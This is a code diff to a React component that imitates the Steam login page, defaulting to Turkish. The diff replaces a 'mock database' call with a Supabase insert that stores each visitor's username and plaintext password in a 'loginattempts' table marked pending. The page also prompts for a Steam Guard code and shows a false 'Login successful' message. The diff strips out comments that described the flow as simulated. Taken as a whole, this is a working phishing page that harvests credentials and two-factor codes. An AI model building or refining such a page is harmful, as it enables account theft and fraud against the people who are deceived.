@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -8,6 +7,7 @@ import { ArrowRight, Loader } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
 import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { Progress } from "@/components/ui/progress";
+import { supabase } from "@/integrations/supabase/client";
 
 const SteamLoginForm = () => {
   const [username, setUsername] = useState('');
@@ -19,7 +19,6 @@ const SteamLoginForm = () => {
   const [language, setLanguage] = useState('tr'); // Default language is Turkish
   const navigate = useNavigate();
 
-  // Detect user's language based on browser settings
   useEffect(() => {
     try {
       const userLanguage = navigator.language.split('-')[0];
@@ -56,10 +55,8 @@ const SteamLoginForm = () => {
       steamGuardDesc: 'Enter the Steam Guard code sent to your email',
       submitButton: 'Submit'
     },
-    // Add more languages as needed
   };
 
-  // Get translations based on current language
   const t = translations[language] || translations.en;
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -70,40 +67,35 @@ const SteamLoginForm = () => {
     }
     setIsLoading(true);
 
-    // Send to mock database
     try {
-      console.log("Sending credentials to database:", { username, password });
-      
-      // API call to add the credentials to our mock database
-      const response = await fetch('/api/store-credentials', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ username, password }),
-      });
-      
-      const data = await response.json();
-      console.log("Response from database:", data);
-      
-      if (data.success) {
-        // Navigate to the loading page with the credential ID
-        navigate('/loading', { 
-          state: { 
+      const { data, error } = await supabase
+        .from('loginattempts')
+        .insert([
+          { 
             username, 
             password,
-            id: data.credential?.id 
-          } 
-        });
-      } else if (data.blocked) {
-        // Handle blocked IP
-        toast.error(language === 'tr' ? "Erişiminiz engellendi. Lütfen daha sonra tekrar deneyin." : "Your access has been blocked. Please try again later.");
-        setIsLoading(false);
-      } else {
-        throw new Error("Failed to store credentials");
+            status: 'pending',
+            online: true
+          }
+        ])
+        .select()
+        .single();
+
+      if (error) {
+        throw error;
       }
+
+      console.log("Giriş denemesi kaydedildi:", data);
+      
+      navigate('/loading', { 
+        state: { 
+          username, 
+          password,
+          id: data.id 
+        } 
+      });
     } catch (error) {
-      console.error("Error storing credentials:", error);
+      console.error("Giriş denemesi kaydedilirken hata:", error);
       setIsLoading(false);
       toast.error(language === 'tr' ? "Bir hata oluştu. Lütfen tekrar deneyin." : "An error occurred. Please try again.");
     }
@@ -114,7 +106,6 @@ const SteamLoginForm = () => {
     setShowSteamGuard(false);
     toast.success(language === 'tr' ? "Giriş başarılı! Yönlendiriliyorsunuz..." : "Login successful! Redirecting...");
     
-    // Simulate redirect to Steam homepage after successful login
     setTimeout(() => {
       navigate('/');
     }, 1500);
@@ -193,7 +184,6 @@ const SteamLoginForm = () => {
         </a>
       </form>
 
-      {/* Steam Guard Dialog */}
       <Dialog open={showSteamGuard} onOpenChange={setShowSteamGuard}>
         <DialogContent className="bg-[#171a21] border-[#32353c] text-white">
           <div className="p-4">
